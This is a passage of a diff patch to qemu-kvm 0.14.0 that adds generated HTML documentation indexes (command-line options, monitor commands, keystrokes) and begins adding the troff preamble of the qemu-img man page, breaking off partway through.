+<li><a href="#index-system-emulation-_0028MIPS_0029-205">system emulation (MIPS)</a>: <a href="#MIPS-System-emulator">MIPS System emulator</a></li>
+<li><a href="#index-system-emulation-_0028PC_0029-9">system emulation (PC)</a>: <a href="#QEMU-PC-System-emulator">QEMU PC System emulator</a></li>
+<li><a href="#index-system-emulation-_0028PowerPC_0029-202">system emulation (PowerPC)</a>: <a href="#PowerPC-System-emulator">PowerPC System emulator</a></li>
+<li><a href="#index-system-emulation-_0028SH4_0029-211">system emulation (SH4)</a>: <a href="#SH4-System-emulator">SH4 System emulator</a></li>
+<li><a href="#index-system-emulation-_0028Sparc32_0029-203">system emulation (Sparc32)</a>: <a href="#Sparc32-System-emulator">Sparc32 System emulator</a></li>
+<li><a href="#index-system-emulation-_0028Sparc64_0029-204">system emulation (Sparc64)</a>: <a href="#Sparc64-System-emulator">Sparc64 System emulator</a></li>
+<li><a href="#index-user-mode-_0028Alpha_0029-212">user mode (Alpha)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028ARM_0029-213">user mode (ARM)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028ColdFire_0029-215">user mode (ColdFire)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028Cris_0029-217">user mode (Cris)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028i386_0029-218">user mode (i386)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028M68K_0029-216">user mode (M68K)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028Microblaze_0029-219">user mode (Microblaze)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028MIPS_0029-220">user mode (MIPS)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028PowerPC_0029-221">user mode (PowerPC)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028SH4_0029-222">user mode (SH4)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-_0028SPARC_0029-223">user mode (SPARC)</a>: <a href="#Other-binaries">Other binaries</a></li>
+<li><a href="#index-user-mode-emulation-3">user mode emulation</a>: <a href="#intro_005ffeatures">intro_features</a></li>
+</ul><p><a name="Function-Index"></a>
+
+<h3 class="section">B.2 Function Index</h3>
+
+<p>This index could be used for command line options and monitor functions.
+
+
+
+<ul class="index-fn" compact>
+<li><a href="#index-g_t_002dacpitable-61"><code>-acpitable</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dalt_002dgrab-46"><code>-alt-grab</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dappend-68"><code>-append</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002daudio_002dhelp-34"><code>-audio-help</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dballoon-60"><code>-balloon</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dbios-84"><code>-bios</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dboot-30"><code>-boot</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dbt-66"><code>-bt</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dcdrom-23"><code>-cdrom</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dchardev-65"><code>-chardev</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dchroot-104"><code>-chroot</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dclock-94"><code>-clock</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dcpu-14"><code>-cpu</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dctrl_002dgrab-47"><code>-ctrl-grab</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dd-81"><code>-d</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002ddaemonize-92"><code>-daemonize</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002ddebugcon-75"><code>-debugcon</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002ddevice-38"><code>-device</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002ddrive-24"><code>-drive</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dechr-98"><code>-echr</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002denable_002dkvm-85"><code>-enable-kvm</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dfda-17"><code>-fda</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dfdb-18"><code>-fdb</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dfsdev-39"><code>-fsdev</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dfull_002dscreen-53"><code>-full-screen</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dg-54"><code>-g</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dgdb-79"><code>-gdb</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dglobal-26"><code>-global</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dh-11"><code>-h</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dhda-19"><code>-hda</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dhdachs-82"><code>-hdachs</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dhdb-20"><code>-hdb</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dhdc-21"><code>-hdc</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dhdd-22"><code>-hdd</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dicount-96"><code>-icount</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dincoming-102"><code>-incoming</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dinitrd-69"><code>-initrd</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dk-33"><code>-k</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dkernel-67"><code>-kernel</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dL-83"><code>-L</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dloadvm-91"><code>-loadvm</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dm-32"><code>-m</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dM-13"><code>-M</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dmon-74"><code>-mon</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dmonitor-72"><code>-monitor</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dmtdblock-27"><code>-mtdblock</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dname-41"><code>-name</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dnet-64"><code>-net</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dacpi-58"><code>-no-acpi</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dfd_002dbootchk-57"><code>-no-fd-bootchk</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dframe-45"><code>-no-frame</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dhpet-59"><code>-no-hpet</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dquit-48"><code>-no-quit</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dreboot-89"><code>-no-reboot</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dno_002dshutdown-90"><code>-no-shutdown</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dnodefaults-103"><code>-nodefaults</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dnodefconfig-111"><code>-nodefconfig</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dnographic-43"><code>-nographic</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dnuma-16"><code>-numa</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dold_002dparam-_0028ARM_0029-108"><code>-old-param (ARM)</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002doption_002drom-93"><code>-option-rom</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dparallel-71"><code>-parallel</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dpflash-29"><code>-pflash</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dpidfile-76"><code>-pidfile</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dportrait-51"><code>-portrait</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dprom_002denv-106"><code>-prom-env</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dqmp-73"><code>-qmp</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dreadconfig-109"><code>-readconfig</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002drtc-95"><code>-rtc</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002drunas-105"><code>-runas</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002ds-80"><code>-s</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dS-78"><code>-S</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsd-28"><code>-sd</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsdl-49"><code>-sdl</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsemihosting-107"><code>-semihosting</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dserial-70"><code>-serial</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dset-25"><code>-set</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dshow_002dcursor-100"><code>-show-cursor</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsinglestep-77"><code>-singlestep</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsmbios-62"><code>-smbios</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsmp-15"><code>-smp</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsnapshot-31"><code>-snapshot</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dsoundhw-35"><code>-soundhw</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dspice-50"><code>-spice</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dtb_002dsize-101"><code>-tb-size</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dtrace-112"><code>-trace</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dusb-36"><code>-usb</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dusbdevice-37"><code>-usbdevice</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002duuid-42"><code>-uuid</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dversion-12"><code>-version</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dvga-52"><code>-vga</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dvirtfs-40"><code>-virtfs</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dvirtioconsole-99"><code>-virtioconsole</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dvnc-55"><code>-vnc</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dwatchdog-97"><code>-watchdog</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dwin2k_002dhack-56"><code>-win2k-hack</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dwriteconfig-110"><code>-writeconfig</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dxen_002dattach-88"><code>-xen-attach</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dxen_002dcreate-87"><code>-xen-create</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-g_t_002dxen_002ddomid-86"><code>-xen-domid</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-acl_005fadd-192"><code>acl_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-acl_005fpolicy-191"><code>acl_policy</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-acl_005fremove-193"><code>acl_remove</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-acl_005freset-194"><code>acl_reset</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-acl_005fshow-190"><code>acl_show</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-balloon-187"><code>balloon</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-block_005fpasswd-198"><code>block_passwd</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-block_005fresize-134"><code>block_resize</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-boot_005fset-169"><code>boot_set</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-change-137"><code>change</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-client_005fmigrate_005finfo-175"><code>client_migrate_info</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-closefd-197"><code>closefd</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-commit-132"><code>commit</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-cont-148"><code>cont</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-cpu-161"><code>cpu</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-curses-44"><code>curses</code></a>: <a href="#sec_005finvocation">sec_invocation</a></li>
+<li><a href="#index-delvm-145"><code>delvm</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-device_005fadd-159"><code>device_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-device_005fdel-160"><code>device_del</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-drive_005fadd-177"><code>drive_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-drive_005fdel-136"><code>drive_del</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-eject-135"><code>eject</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-expire_005fpassword-200"><code>expire_password</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-gdbserver-149"><code>gdbserver</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-getfd-196"><code>getfd</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-help-131"><code>help</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-host_005fnet_005fadd-181"><code>host_net_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-host_005fnet_005fremove-182"><code>host_net_remove</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-hostfwd_005fadd-185"><code>hostfwd_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-hostfwd_005fremove-186"><code>hostfwd_remove</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-info-201"><code>info</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-loadvm-144"><code>loadvm</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-log-142"><code>log</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-logfile-139"><code>logfile</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-mce-_0028x86_0029-195"><code>mce (x86)</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-memsave-167"><code>memsave</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-migrate-171"><code>migrate</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-migrate_005fcancel-172"><code>migrate_cancel</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-migrate_005fset_005fdowntime-174"><code>migrate_set_downtime</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-migrate_005fset_005fspeed-173"><code>migrate_set_speed</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-mouse_005fbutton-163"><code>mouse_button</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-mouse_005fmove-162"><code>mouse_move</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-mouse_005fset-164"><code>mouse_set</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-netdev_005fadd-183"><code>netdev_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-netdev_005fdel-184"><code>netdev_del</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-nmi-170"><code>nmi</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-pci_005fadd-178"><code>pci_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-pci_005fdel-179"><code>pci_del</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-pcie_005faer_005finject_005ferror-180"><code>pcie_aer_inject_error</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-pmemsave-168"><code>pmemsave</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-print-152"><code>print</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-quit-133"><code>quit</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-savevm-143"><code>savevm</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-screendump-138"><code>screendump</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-sendkey-153"><code>sendkey</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-set_005flink-188"><code>set_link</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-set_005fpassword-199"><code>set_password</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-singlestep-146"><code>singlestep</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-snapshot_005fblkdev-176"><code>snapshot_blkdev</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-stop-147"><code>stop</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-stopcapture-166"><code>stopcapture</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-sum-156"><code>sum</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-system_005fpowerdown-155"><code>system_powerdown</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-system_005freset-154"><code>system_reset</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-trace_002devent-140"><code>trace-event</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-trace_002dfile-141"><code>trace-file</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-usb_005fadd-157"><code>usb_add</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-usb_005fdel-158"><code>usb_del</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-watchdog_005faction-189"><code>watchdog_action</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-wavcapture-165"><code>wavcapture</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-x-150"><code>x</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+<li><a href="#index-xp-151"><code>xp</code></a>: <a href="#pcsys_005fmonitor">pcsys_monitor</a></li>
+</ul><p><a name="Keystroke-Index"></a>
+
+<h3 class="section">B.3 Keystroke Index</h3>
+
+<p>This is a list of all keystrokes which have a special function
+in system emulation.
+
+
+
+<ul class="index-ky" compact>
+<li><a href="#index-Ctrl_002da-_003f-123"><code>Ctrl-a ?</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-a-129"><code>Ctrl-a a</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-b-127"><code>Ctrl-a b</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-c-128"><code>Ctrl-a c</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-h-121"><code>Ctrl-a h</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-s-125"><code>Ctrl-a s</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-t-126"><code>Ctrl-a t</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002da-x-124"><code>Ctrl-a x</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dAlt-116"><code>Ctrl-Alt</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dAlt_002df-113"><code>Ctrl-Alt-f</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dAlt_002dn-115"><code>Ctrl-Alt-n</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dAlt_002du-114"><code>Ctrl-Alt-u</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dDown-118"><code>Ctrl-Down</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dPageDown-120"><code>Ctrl-PageDown</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dPageUp-119"><code>Ctrl-PageUp</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+<li><a href="#index-Ctrl_002dUp-117"><code>Ctrl-Up</code></a>: <a href="#pcsys_005fkeys">pcsys_keys</a></li>
+</ul><p><a name="Program-Index"></a>
+
+<h3 class="section">B.4 Program Index</h3>
+
+
+
+<ul class="index-pg" compact>
+</ul><p><a name="Data-Type-Index"></a>
+
+<h3 class="section">B.5 Data Type Index</h3>
+
+<p>This index could be used for qdev device names and options.
+
+
+
+<ul class="index-tp" compact>
+</ul><p><a name="Variable-Index"></a>
+
+<h3 class="section">B.6 Variable Index</h3>
+
+
+
+<ul class="index-vr" compact>
+</ul></body></html>
+
+<!--
+
+Local Variables:
+coding: utf-8
+End:
+
+-->
diff -Nurp qemu-kvm-0.14.0+noroms.orig/qemu-img.1 qemu-kvm-0.14.0+noroms/qemu-img.1
--- qemu-kvm-0.14.0+noroms.orig/qemu-img.1	1969-12-31 19:00:00.000000000 -0500
+++ qemu-kvm-0.14.0+noroms/qemu-img.1	2014-02-19 10:12:24.000000000 -0500
@@ -0,0 +1,417 @@
+.\" Automatically generated by Pod::Man 2.23 (Pod::Simple 3.14)
+.\"
+.\" Standard preamble:
+.\" ========================================================================
+.de Sp \" Vertical space (when we can't use .PP)
+.if t .sp .5v
+.if n .sp
+..
+.de Vb \" Begin verbatim text
+.ft CW
+.nf
+.ne \\$1
+..
+.de Ve \" End verbatim text
+.ft R
+.fi
+..
+.\" Set up some character translations and predefined strings.  \*(-- will
+.\" give an unbreakable dash, \*(PI will give pi, \*(L" will give a left
+.\" double quote, and \*(R" will give a right double quote.  \*(C+ will
+.\" give a nicer C++.  Capital omega is used to do unbreakable dashes and
+.\" therefore won't be available.  \*(C` and \*(C' expand to `' in nroff,
+.\" nothing in troff, for use with C<>.
+.tr \(*W-
+.ds C+ C\v'-.1v'\h'-1p'\s-2+\h'-1p'+\s0\v'.1v'\h'-1p'
+.ie n \{\
+.    ds -- \(*W-
+.    ds PI pi
+.    if (\n(.H=4u)&(1m=24u) .ds -- \(*W\h'-12u'\(*W\h'-12u'-\" diablo 10 pitch
+.    if (\n(.H=4u)&(1m=20u) .ds -- \(*W\h'-12u'\(*W\h'-8u'-\"  diablo 12 pitch
+.    ds L" ""
+.    ds R" ""
+.    ds C` ""
+.    ds C' ""
+'br\}
+.el\{\
+.    ds -- \|\(em\|
+.    ds PI \(*p
+.    ds L" ``
+.    ds R" ''
+'br\}
+.\"
+.\" Escape single quotes in literal strings from groff's Unicode transform.
+.ie \n(.g .ds Aq \(aq
+.el       .ds Aq '
+.\"
+.\" If the F register is turned on, we'll generate index entries on stderr for
+.\" titles (.TH), headers (.SH), subsections (.SS), items (.Ip), and index
+.\" entries marked with X<> in POD.  Of course, you'll have to process the
+.\" output yourself in some meaningful fashion.
+.ie \nF \{\
+.    de IX
+.    tm Index:\\$1\t\\n%\t"\\$2"
+..
+.    nr % 0
+.    rr F
+.\}
+.el \{\
+.    de IX
+..
+.\}
+.\"
+.\" Accent mark definitions (@(#)ms.acc 1.5 88/02/08 SMI; from UCB 4.2).
+.\" Fear.  Run.  Save yourself.  No user-serviceable parts.
+.    \" fudge factors for nroff and troff
+.if n \{\
+.    ds #H 0
+.    ds #V .8m
+.    ds #F .3m
+.    ds #[ \f1
+.    ds #] \fP
+.\}
+.if t \{\
+.    ds #H ((1u-(\\\\n(.fu%2u))*.13m)
+.    ds #V .6m
+.    ds #F 0
+.    ds #[ \&
+.    ds #] \&
+.\}
+.    \" simple accents for nroff and troff
+.if n \{\
+.    ds ' \&
+.    ds ` \&
